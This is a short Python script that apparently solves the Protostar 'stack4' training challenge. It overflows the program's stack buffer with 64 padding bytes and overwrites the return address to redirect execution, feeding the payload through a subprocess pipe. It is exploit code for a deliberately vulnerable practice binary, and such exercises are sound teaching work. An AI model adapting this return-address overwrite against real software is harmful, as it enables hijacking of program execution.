import subprocess

def main():
    flag = (("A" * 64) + "\xf4\x83\x04\x08" * 4)
    process = "/opt/protostar/bin/stack4"

    # print >> open("flag", 'w'), flag

    sp = subprocess.Popen(process, stdin=subprocess.PIPE)
    sp.communicate(input=flag)

if __name__ == '__main__':
    main()

